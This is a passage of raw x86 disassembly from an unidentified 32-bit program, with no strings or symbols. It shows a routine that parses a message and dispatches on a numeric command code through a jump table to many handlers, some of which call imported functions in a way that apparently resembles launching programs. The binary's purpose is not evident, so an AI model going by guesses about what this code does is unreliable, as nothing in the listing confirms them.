  40796a:	ff 15 9c d2 40 00    	call   *0x40d29c
  407970:	8d 8d a0 fc ff ff    	lea    -0x360(%ebp),%ecx
  407976:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40797c:	8d 8d 80 fc ff ff    	lea    -0x380(%ebp),%ecx
  407982:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407988:	8d 8d 60 fc ff ff    	lea    -0x3a0(%ebp),%ecx
  40798e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407994:	8d 8d 40 fc ff ff    	lea    -0x3c0(%ebp),%ecx
  40799a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4079a0:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  4079a6:	ff 15 9c d2 40 00    	call   *0x40d29c
  4079ac:	6a 01                	push   $0x1
  4079ae:	68 57 7a 40 00       	push   $0x407a57
  4079b3:	8b cf                	mov    %edi,%ecx
  4079b5:	e8 f7 97 ff ff       	call   0x4011b1
  4079ba:	e8 b6 a6 ff ff       	call   0x402075
  4079bf:	83 ec 10             	sub    $0x10,%esp
  4079c2:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4079c5:	8b cc                	mov    %esp,%ecx
  4079c7:	50                   	push   %eax
  4079c8:	68 fc dc 40 00       	push   $0x40dcfc
  4079cd:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4079d3:	83 ec 10             	sub    $0x10,%esp
  4079d6:	8d 45 e9             	lea    -0x17(%ebp),%eax
  4079d9:	8b cc                	mov    %esp,%ecx
  4079db:	50                   	push   %eax
  4079dc:	56                   	push   %esi
  4079dd:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4079e3:	e8 08 32 00 00       	call   0x40abf0
  4079e8:	83 c4 20             	add    $0x20,%esp
  4079eb:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4079ee:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4079f4:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  4079f7:	ff 15 9c d2 40 00    	call   *0x40d29c
  4079fd:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  407a03:	ff 15 9c d2 40 00    	call   *0x40d29c
  407a09:	33 ff                	xor    %edi,%edi
  407a0b:	ff 4d f4             	decl   -0xc(%ebp)
  407a0e:	ff 45 f8             	incl   -0x8(%ebp)
  407a11:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  407a14:	e8 76 a1 ff ff       	call   0x401b8f
  407a19:	39 45 f8             	cmp    %eax,-0x8(%ebp)
  407a1c:	72 2c                	jb     0x407a4a
  407a1e:	6a 02                	push   $0x2
  407a20:	b9 20 1a 41 00       	mov    $0x411a20,%ecx
  407a25:	89 7d f8             	mov    %edi,-0x8(%ebp)
  407a28:	e8 32 a1 ff ff       	call   0x401b5f
  407a2d:	8b c8                	mov    %eax,%ecx
  407a2f:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407a35:	50                   	push   %eax
  407a36:	ff 15 58 d3 40 00    	call   *0x40d358
  407a3c:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
  407a42:	59                   	pop    %ecx
  407a43:	50                   	push   %eax
  407a44:	ff 15 94 d1 40 00    	call   *0x40d194
  407a4a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407a4d:	e8 de a0 ff ff       	call   0x401b30
  407a52:	e9 11 f6 ff ff       	jmp    0x407068
  407a57:	55                   	push   %ebp
  407a58:	8b ec                	mov    %esp,%ebp
  407a5a:	81 ec e0 01 00 00    	sub    $0x1e0,%esp
  407a60:	53                   	push   %ebx
  407a61:	56                   	push   %esi
  407a62:	8b 75 08             	mov    0x8(%ebp),%esi
  407a65:	57                   	push   %edi
  407a66:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  407a69:	8d 46 18             	lea    0x18(%esi),%eax
  407a6c:	50                   	push   %eax
  407a6d:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  407a73:	ff 76 28             	push   0x28(%esi)
  407a76:	ff 15 88 d1 40 00    	call   *0x40d188
  407a7c:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  407a7f:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407a85:	8b 38                	mov    (%eax),%edi
  407a87:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  407a8c:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  407a8f:	ff 30                	push   (%eax)
  407a91:	8d 45 b0             	lea    -0x50(%ebp),%eax
  407a94:	6a 04                	push   $0x4
  407a96:	50                   	push   %eax
  407a97:	ff 15 cc d2 40 00    	call   *0x40d2cc
  407a9d:	83 ec 10             	sub    $0x10,%esp
  407aa0:	be 68 11 41 00       	mov    $0x411168,%esi
  407aa5:	8b cc                	mov    %esp,%ecx
  407aa7:	56                   	push   %esi
  407aa8:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  407aae:	83 ec 10             	sub    $0x10,%esp
  407ab1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  407ab4:	8b cc                	mov    %esp,%ecx
  407ab6:	50                   	push   %eax
  407ab7:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  407abd:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407ac0:	50                   	push   %eax
  407ac1:	e8 27 39 00 00       	call   0x40b3ed
  407ac6:	b8 8f 00 00 00       	mov    $0x8f,%eax
  407acb:	83 c4 24             	add    $0x24,%esp
  407ace:	3b f8                	cmp    %eax,%edi
  407ad0:	0f 87 4d 0c 00 00    	ja     0x408723
  407ad6:	0f 84 9b 0b 00 00    	je     0x408677
  407adc:	8d 47 ff             	lea    -0x1(%edi),%eax
  407adf:	83 f8 33             	cmp    $0x33,%eax
  407ae2:	0f 87 d1 0d 00 00    	ja     0x4088b9
  407ae8:	33 db                	xor    %ebx,%ebx
  407aea:	ff 24 85 dc 88 40 00 	jmp    *0x4088dc(,%eax,4)
  407af1:	ff 15 bc d0 40 00    	call   *0x40d0bc
  407af7:	50                   	push   %eax
  407af8:	8d 45 a0             	lea    -0x60(%ebp),%eax
  407afb:	50                   	push   %eax
  407afc:	e8 90 36 00 00       	call   0x40b191
  407b01:	51                   	push   %ecx
  407b02:	51                   	push   %ecx
  407b03:	8b fc                	mov    %esp,%edi
  407b05:	50                   	push   %eax
  407b06:	56                   	push   %esi
  407b07:	e8 08 36 00 00       	call   0x40b114
  407b0c:	50                   	push   %eax
  407b0d:	8d 85 30 fe ff ff    	lea    -0x1d0(%ebp),%eax
  407b13:	50                   	push   %eax
  407b14:	e8 78 36 00 00       	call   0x40b191
  407b19:	59                   	pop    %ecx
  407b1a:	59                   	pop    %ecx
  407b1b:	50                   	push   %eax
  407b1c:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  407b22:	56                   	push   %esi
  407b23:	50                   	push   %eax
  407b24:	e8 b0 35 00 00       	call   0x40b0d9
  407b29:	50                   	push   %eax
  407b2a:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  407b30:	50                   	push   %eax
  407b31:	e8 98 37 00 00       	call   0x40b2ce
  407b36:	83 c4 0c             	add    $0xc,%esp
  407b39:	33 db                	xor    %ebx,%ebx
  407b3b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407b3e:	50                   	push   %eax
  407b3f:	56                   	push   %esi
  407b40:	53                   	push   %ebx
  407b41:	e8 19 a0 ff ff       	call   0x401b5f
  407b46:	50                   	push   %eax
  407b47:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
  407b4d:	50                   	push   %eax
  407b4e:	e8 65 4b 00 00       	call   0x40c6b8
  407b53:	83 c4 0c             	add    $0xc,%esp
  407b56:	50                   	push   %eax
  407b57:	8d 85 70 fe ff ff    	lea    -0x190(%ebp),%eax
  407b5d:	50                   	push   %eax
  407b5e:	e8 55 4b 00 00       	call   0x40c6b8
  407b63:	83 c4 0c             	add    $0xc,%esp
  407b66:	50                   	push   %eax
  407b67:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  407b6d:	50                   	push   %eax
  407b6e:	e8 45 4b 00 00       	call   0x40c6b8
  407b73:	83 c4 0c             	add    $0xc,%esp
  407b76:	50                   	push   %eax
  407b77:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
  407b7d:	50                   	push   %eax
  407b7e:	e8 35 4b 00 00       	call   0x40c6b8
  407b83:	83 c4 0c             	add    $0xc,%esp
  407b86:	50                   	push   %eax
  407b87:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
  407b8d:	50                   	push   %eax
  407b8e:	e8 25 4b 00 00       	call   0x40c6b8
  407b93:	83 c4 0c             	add    $0xc,%esp
  407b96:	50                   	push   %eax
  407b97:	57                   	push   %edi
  407b98:	e8 1b 4b 00 00       	call   0x40c6b8
  407b9d:	83 c4 0c             	add    $0xc,%esp
  407ba0:	be 70 1b 41 00       	mov    $0x411b70,%esi
  407ba5:	8b ce                	mov    %esi,%ecx
  407ba7:	6a 4c                	push   $0x4c
  407ba9:	e8 7c 95 ff ff       	call   0x40112a
  407bae:	8d 8d 10 ff ff ff    	lea    -0xf0(%ebp),%ecx
  407bb4:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407bba:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  407bc0:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407bc6:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  407bcc:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407bd2:	8d 8d 70 fe ff ff    	lea    -0x190(%ebp),%ecx
  407bd8:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407bde:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  407be4:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407bea:	8d 8d b0 fe ff ff    	lea    -0x150(%ebp),%ecx
  407bf0:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407bf6:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  407bfc:	ff 15 9c d2 40 00    	call   *0x40d29c
  407c02:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  407c08:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407c0e:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  407c11:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407c17:	6a 01                	push   $0x1
  407c19:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407c1c:	e8 3e 9f ff ff       	call   0x401b5f
  407c21:	8b c8                	mov    %eax,%ecx
  407c23:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407c29:	50                   	push   %eax
  407c2a:	ff 15 58 d3 40 00    	call   *0x40d358
  407c30:	3b c3                	cmp    %ebx,%eax
  407c32:	59                   	pop    %ecx
  407c33:	76 25                	jbe    0x407c5a
  407c35:	8b ce                	mov    %esi,%ecx
  407c37:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  407c3a:	e8 3c 96 ff ff       	call   0x40127b
  407c3f:	84 c0                	test   %al,%al
  407c41:	57                   	push   %edi
  407c42:	8b ce                	mov    %esi,%ecx
  407c44:	74 0a                	je     0x407c50
  407c46:	e8 42 9a ff ff       	call   0x40168d
  407c4b:	e9 69 0c 00 00       	jmp    0x4088b9
  407c50:	e8 8c 99 ff ff       	call   0x4015e1
  407c55:	e9 5f 0c 00 00       	jmp    0x4088b9
  407c5a:	68 c4 dc 40 00       	push   $0x40dcc4
  407c5f:	53                   	push   %ebx
  407c60:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407c63:	e8 f7 9e ff ff       	call   0x401b5f
  407c68:	50                   	push   %eax
  407c69:	ff 15 74 d2 40 00    	call   *0x40d274
  407c6f:	59                   	pop    %ecx
  407c70:	84 c0                	test   %al,%al
  407c72:	59                   	pop    %ecx
  407c73:	0f 84 40 0c 00 00    	je     0x4088b9
  407c79:	53                   	push   %ebx
  407c7a:	8b ce                	mov    %esi,%ecx
  407c7c:	eb 07                	jmp    0x407c85
  407c7e:	6a 00                	push   $0x0
  407c80:	b9 70 1b 41 00       	mov    $0x411b70,%ecx
  407c85:	e8 a2 9a ff ff       	call   0x40172c
  407c8a:	e9 2a 0c 00 00       	jmp    0x4088b9
  407c8f:	33 db                	xor    %ebx,%ebx
  407c91:	68 74 dd 40 00       	push   $0x40dd74
  407c96:	53                   	push   %ebx
  407c97:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407c9a:	e8 c0 9e ff ff       	call   0x401b5f
  407c9f:	50                   	push   %eax
  407ca0:	ff 15 74 d2 40 00    	call   *0x40d274
  407ca6:	59                   	pop    %ecx
  407ca7:	84 c0                	test   %al,%al
  407ca9:	59                   	pop    %ecx
  407caa:	0f 84 09 0c 00 00    	je     0x4088b9
  407cb0:	6a 02                	push   $0x2
  407cb2:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407cb5:	e8 a5 9e ff ff       	call   0x401b5f
  407cba:	50                   	push   %eax
  407cbb:	8d 85 90 fe ff ff    	lea    -0x170(%ebp),%eax
  407cc1:	50                   	push   %eax
  407cc2:	e8 33 36 00 00       	call   0x40b2fa
  407cc7:	59                   	pop    %ecx
  407cc8:	59                   	pop    %ecx
  407cc9:	8b c8                	mov    %eax,%ecx
  407ccb:	ff 15 98 d2 40 00    	call   *0x40d298
  407cd1:	50                   	push   %eax
  407cd2:	6a 01                	push   $0x1
  407cd4:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407cd7:	e8 83 9e ff ff       	call   0x401b5f
  407cdc:	8b c8                	mov    %eax,%ecx
  407cde:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407ce4:	8a 00                	mov    (%eax),%al
  407ce6:	50                   	push   %eax
  407ce7:	8d 45 e0             	lea    -0x20(%ebp),%eax
  407cea:	50                   	push   %eax
  407ceb:	e8 e9 ce ff ff       	call   0x404bd9
  407cf0:	83 c4 0c             	add    $0xc,%esp
  407cf3:	8d 8d 90 fe ff ff    	lea    -0x170(%ebp),%ecx
  407cf9:	ff 15 9c d2 40 00    	call   *0x40d29c
  407cff:	53                   	push   %ebx
  407d00:	53                   	push   %ebx
  407d01:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  407d04:	ff 15 98 d2 40 00    	call   *0x40d298
  407d0a:	50                   	push   %eax
  407d0b:	6a 03                	push   $0x3
  407d0d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407d10:	e8 4a 9e ff ff       	call   0x401b5f
  407d15:	50                   	push   %eax
  407d16:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  407d1c:	50                   	push   %eax
  407d1d:	e8 d8 35 00 00       	call   0x40b2fa
  407d22:	59                   	pop    %ecx
  407d23:	59                   	pop    %ecx
  407d24:	8b c8                	mov    %eax,%ecx
  407d26:	ff 15 98 d2 40 00    	call   *0x40d298
  407d2c:	50                   	push   %eax
  407d2d:	53                   	push   %ebx
  407d2e:	e8 e5 49 00 00       	call   0x40c718
  407d33:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  407d39:	ff 15 9c d2 40 00    	call   *0x40d29c
  407d3f:	6a 01                	push   $0x1
  407d41:	53                   	push   %ebx
  407d42:	53                   	push   %ebx
  407d43:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  407d46:	ff 15 98 d2 40 00    	call   *0x40d298
  407d4c:	50                   	push   %eax
  407d4d:	68 d0 d6 40 00       	push   $0x40d6d0
  407d52:	53                   	push   %ebx
  407d53:	ff 15 9c d3 40 00    	call   *0x40d39c
  407d59:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  407d5c:	e9 eb 08 00 00       	jmp    0x40864c
  407d61:	33 db                	xor    %ebx,%ebx
  407d63:	68 74 dd 40 00       	push   $0x40dd74
  407d68:	53                   	push   %ebx
  407d69:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407d6c:	e8 ee 9d ff ff       	call   0x401b5f
  407d71:	50                   	push   %eax
  407d72:	ff 15 74 d2 40 00    	call   *0x40d274
  407d78:	59                   	pop    %ecx
  407d79:	84 c0                	test   %al,%al
  407d7b:	59                   	pop    %ecx
  407d7c:	0f 84 37 0b 00 00    	je     0x4088b9
  407d82:	6a 02                	push   $0x2
  407d84:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407d87:	e8 d3 9d ff ff       	call   0x401b5f
  407d8c:	50                   	push   %eax
  407d8d:	8d 85 50 fe ff ff    	lea    -0x1b0(%ebp),%eax
  407d93:	50                   	push   %eax
  407d94:	e8 61 35 00 00       	call   0x40b2fa
  407d99:	59                   	pop    %ecx
  407d9a:	59                   	pop    %ecx
  407d9b:	8b c8                	mov    %eax,%ecx
  407d9d:	ff 15 98 d2 40 00    	call   *0x40d298
  407da3:	50                   	push   %eax
  407da4:	6a 01                	push   $0x1
  407da6:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407da9:	e8 b1 9d ff ff       	call   0x401b5f
  407dae:	8b c8                	mov    %eax,%ecx
  407db0:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407db6:	8a 00                	mov    (%eax),%al
  407db8:	50                   	push   %eax
  407db9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  407dbc:	50                   	push   %eax
  407dbd:	e8 17 ce ff ff       	call   0x404bd9
  407dc2:	83 c4 0c             	add    $0xc,%esp
  407dc5:	8d 8d 50 fe ff ff    	lea    -0x1b0(%ebp),%ecx
  407dcb:	ff 15 9c d2 40 00    	call   *0x40d29c
  407dd1:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  407dd4:	ff 15 98 d2 40 00    	call   *0x40d298
  407dda:	50                   	push   %eax
  407ddb:	6a 03                	push   $0x3
  407ddd:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407de0:	e8 7a 9d ff ff       	call   0x401b5f
  407de5:	83 ec 10             	sub    $0x10,%esp
  407de8:	8b cc                	mov    %esp,%ecx
  407dea:	50                   	push   %eax
  407deb:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  407df1:	e8 40 3a 00 00       	call   0x40b836
  407df6:	83 c4 14             	add    $0x14,%esp
  407df9:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  407dfc:	6a 01                	push   $0x1
  407dfe:	53                   	push   %ebx
  407dff:	53                   	push   %ebx
  407e00:	ff 15 98 d2 40 00    	call   *0x40d298
  407e06:	50                   	push   %eax
  407e07:	68 d0 d6 40 00       	push   $0x40d6d0
  407e0c:	53                   	push   %ebx
  407e0d:	ff 15 9c d3 40 00    	call   *0x40d39c
  407e13:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  407e16:	e9 31 08 00 00       	jmp    0x40864c
  407e1b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407e1e:	6a 0a                	push   $0xa
  407e20:	50                   	push   %eax
  407e21:	ff 15 cc d0 40 00    	call   *0x40d0cc
  407e27:	50                   	push   %eax
  407e28:	ff 15 88 d3 40 00    	call   *0x40d388
  407e2e:	51                   	push   %ecx
  407e2f:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407e32:	8b fc                	mov    %esp,%edi
  407e34:	50                   	push   %eax
  407e35:	8d 45 80             	lea    -0x80(%ebp),%eax
  407e38:	56                   	push   %esi
  407e39:	50                   	push   %eax
  407e3a:	e8 5f d8 ff ff       	call   0x40569e
  407e3f:	59                   	pop    %ecx
  407e40:	50                   	push   %eax
  407e41:	8d 45 90             	lea    -0x70(%ebp),%eax
  407e44:	50                   	push   %eax
  407e45:	e8 6e 48 00 00       	call   0x40c6b8
  407e4a:	83 c4 0c             	add    $0xc,%esp
  407e4d:	50                   	push   %eax
  407e4e:	57                   	push   %edi
  407e4f:	e8 4c 48 00 00       	call   0x40c6a0
  407e54:	83 c4 0c             	add    $0xc,%esp
  407e57:	b9 70 1b 41 00       	mov    $0x411b70,%ecx
  407e5c:	6a 4f                	push   $0x4f
  407e5e:	e8 c7 92 ff ff       	call   0x40112a
  407e63:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  407e66:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407e6c:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  407e6f:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  407e75:	e9 3f 0a 00 00       	jmp    0x4088b9
  407e7a:	6a 00                	push   $0x0
  407e7c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407e7f:	e8 db 9c ff ff       	call   0x401b5f
  407e84:	8b c8                	mov    %eax,%ecx
  407e86:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407e8c:	50                   	push   %eax
  407e8d:	ff 15 58 d3 40 00    	call   *0x40d358
  407e93:	50                   	push   %eax
  407e94:	e8 9c 32 00 00       	call   0x40b135
  407e99:	e9 19 0a 00 00       	jmp    0x4088b7
  407e9e:	6a 00                	push   $0x0
  407ea0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407ea3:	e8 b7 9c ff ff       	call   0x401b5f
  407ea8:	8b c8                	mov    %eax,%ecx
  407eaa:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407eb0:	50                   	push   %eax
  407eb1:	ff 15 58 d3 40 00    	call   *0x40d358
  407eb7:	59                   	pop    %ecx
  407eb8:	50                   	push   %eax
  407eb9:	ff 15 e4 d3 40 00    	call   *0x40d3e4
  407ebf:	e9 f5 09 00 00       	jmp    0x4088b9
  407ec4:	6a 03                	push   $0x3
  407ec6:	eb 02                	jmp    0x407eca
  407ec8:	6a 09                	push   $0x9
  407eca:	6a 00                	push   $0x0
  407ecc:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407ecf:	e8 8b 9c ff ff       	call   0x401b5f
  407ed4:	8b c8                	mov    %eax,%ecx
  407ed6:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407edc:	50                   	push   %eax
  407edd:	ff 15 58 d3 40 00    	call   *0x40d358
  407ee3:	59                   	pop    %ecx
  407ee4:	50                   	push   %eax
  407ee5:	ff 15 e8 d3 40 00    	call   *0x40d3e8
  407eeb:	e9 c9 09 00 00       	jmp    0x4088b9
  407ef0:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  407ef3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407ef6:	50                   	push   %eax
  407ef7:	6a 00                	push   $0x0
  407ef9:	e8 61 9c ff ff       	call   0x401b5f
  407efe:	8b c8                	mov    %eax,%ecx
  407f00:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407f06:	50                   	push   %eax
  407f07:	ff 15 58 d3 40 00    	call   *0x40d358
  407f0d:	59                   	pop    %ecx
  407f0e:	50                   	push   %eax
  407f0f:	ff 15 ec d3 40 00    	call   *0x40d3ec
  407f15:	ff 75 d4             	push   -0x2c(%ebp)
  407f18:	e8 18 32 00 00       	call   0x40b135
  407f1d:	59                   	pop    %ecx
  407f1e:	e9 d2 08 00 00       	jmp    0x4087f5
  407f23:	6a 00                	push   $0x0
  407f25:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407f28:	e8 32 9c ff ff       	call   0x401b5f
  407f2d:	50                   	push   %eax
  407f2e:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  407f34:	50                   	push   %eax
  407f35:	e8 c0 33 00 00       	call   0x40b2fa
  407f3a:	59                   	pop    %ecx
  407f3b:	59                   	pop    %ecx
  407f3c:	8b c8                	mov    %eax,%ecx
  407f3e:	ff 15 98 d2 40 00    	call   *0x40d298
  407f44:	50                   	push   %eax
  407f45:	ff 15 34 d3 40 00    	call   *0x40d334
  407f4b:	59                   	pop    %ecx
  407f4c:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  407f52:	e9 f5 06 00 00       	jmp    0x40864c
  407f57:	6a 01                	push   $0x1
  407f59:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407f5c:	e8 fe 9b ff ff       	call   0x401b5f
  407f61:	50                   	push   %eax
  407f62:	b9 b8 16 41 00       	mov    $0x4116b8,%ecx
  407f67:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  407f6d:	33 db                	xor    %ebx,%ebx
  407f6f:	38 1d e1 16 41 00    	cmp    %bl,0x4116e1
  407f75:	0f 85 3e 09 00 00    	jne    0x4088b9
  407f7b:	53                   	push   %ebx
  407f7c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407f7f:	e8 db 9b ff ff       	call   0x401b5f
  407f84:	83 ec 10             	sub    $0x10,%esp
  407f87:	8b cc                	mov    %esp,%ecx
  407f89:	50                   	push   %eax
  407f8a:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  407f90:	e8 d7 9c ff ff       	call   0x401c6c
  407f95:	e9 e7 07 00 00       	jmp    0x408781
  407f9a:	33 db                	xor    %ebx,%ebx
  407f9c:	6a 01                	push   $0x1
  407f9e:	53                   	push   %ebx
  407f9f:	53                   	push   %ebx
  407fa0:	53                   	push   %ebx
  407fa1:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407fa4:	e8 b6 9b ff ff       	call   0x401b5f
  407fa9:	50                   	push   %eax
  407faa:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
  407fb0:	50                   	push   %eax
  407fb1:	e8 44 33 00 00       	call   0x40b2fa
  407fb6:	59                   	pop    %ecx
  407fb7:	59                   	pop    %ecx
  407fb8:	8b c8                	mov    %eax,%ecx
  407fba:	ff 15 98 d2 40 00    	call   *0x40d298
  407fc0:	50                   	push   %eax
  407fc1:	68 d0 d6 40 00       	push   $0x40d6d0
  407fc6:	53                   	push   %ebx
  407fc7:	ff 15 9c d3 40 00    	call   *0x40d39c
  407fcd:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  407fd3:	e9 74 06 00 00       	jmp    0x40864c
  407fd8:	33 db                	xor    %ebx,%ebx
  407fda:	39 1d 10 1c 41 00    	cmp    %ebx,0x411c10
  407fe0:	88 1d fd 1c 41 00    	mov    %bl,0x411cfd
  407fe6:	74 0a                	je     0x407ff2
  407fe8:	b9 10 1c 41 00       	mov    $0x411c10,%ecx
  407fed:	e8 6a 91 ff ff       	call   0x40115c
  407ff2:	53                   	push   %ebx
  407ff3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407ff6:	e8 64 9b ff ff       	call   0x401b5f
  407ffb:	50                   	push   %eax
  407ffc:	b9 b0 1c 41 00       	mov    $0x411cb0,%ecx
  408001:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  408007:	6a 02                	push   $0x2
  408009:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40800c:	e8 4e 9b ff ff       	call   0x401b5f
  408011:	8b c8                	mov    %eax,%ecx
  408013:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  408019:	8b 35 58 d3 40 00    	mov    0x40d358,%esi
  40801f:	50                   	push   %eax
  408020:	ff d6                	call   *%esi
  408022:	85 c0                	test   %eax,%eax
  408024:	59                   	pop    %ecx
  408025:	0f 95 c0             	setne  %al
  408028:	50                   	push   %eax
  408029:	6a 01                	push   $0x1
  40802b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40802e:	e8 2c 9b ff ff       	call   0x401b5f
  408033:	8b c8                	mov    %eax,%ecx
  408035:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40803b:	50                   	push   %eax
  40803c:	ff d6                	call   *%esi
  40803e:	59                   	pop    %ecx
  40803f:	50                   	push   %eax
  408040:	e8 9f 18 00 00       	call   0x4098e4
  408045:	e9 6d 08 00 00       	jmp    0x4088b7
  40804a:	b9 10 1c 41 00       	mov    $0x411c10,%ecx
  40804f:	c6 05 fd 1c 41 00 01 	movb   $0x1,0x411cfd
  408056:	e8 01 91 ff ff       	call   0x40115c
  40805b:	e9 59 08 00 00       	jmp    0x4088b9
  408060:	6a 00                	push   $0x0
  408062:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408065:	e8 f5 9a ff ff       	call   0x401b5f
  40806a:	50                   	push   %eax
  40806b:	8d 85 20 ff ff ff    	lea    -0xe0(%ebp),%eax
  408071:	50                   	push   %eax
  408072:	e8 83 32 00 00       	call   0x40b2fa
  408077:	59                   	pop    %ecx
  408078:	59                   	pop    %ecx
  408079:	8b c8                	mov    %eax,%ecx
  40807b:	ff 15 98 d2 40 00    	call   *0x40d298
  408081:	50                   	push   %eax
  408082:	ff 15 48 d1 40 00    	call   *0x40d148
  408088:	8d 8d 20 ff ff ff    	lea    -0xe0(%ebp),%ecx
  40808e:	e9 b9 05 00 00       	jmp    0x40864c
  408093:	6a 00                	push   $0x0
  408095:	ff 15 48 d3 40 00    	call   *0x40d348
  40809b:	33 db                	xor    %ebx,%ebx
  40809d:	38 1d b4 1b 41 00    	cmp    %bl,0x411bb4
  4080a3:	74 0a                	je     0x4080af
  4080a5:	6a 64                	push   $0x64
  4080a7:	ff 15 94 d1 40 00    	call   *0x40d194
  4080ad:	eb ee                	jmp    0x40809d
  4080af:	e8 6d c3 ff ff       	call   0x404421
  4080b4:	e9 00 08 00 00       	jmp    0x4088b9
  4080b9:	e8 6d c9 ff ff       	call   0x404a2b
  4080be:	e9 f6 07 00 00       	jmp    0x4088b9
  4080c3:	33 db                	xor    %ebx,%ebx
  4080c5:	38 1d b4 1b 41 00    	cmp    %bl,0x411bb4
  4080cb:	74 0a                	je     0x4080d7
  4080cd:	6a 64                	push   $0x64
  4080cf:	ff 15 94 d1 40 00    	call   *0x40d194
  4080d5:	eb ee                	jmp    0x4080c5
  4080d7:	6a 01                	push   $0x1
  4080d9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4080dc:	e8 7e 9a ff ff       	call   0x401b5f
  4080e1:	50                   	push   %eax
  4080e2:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
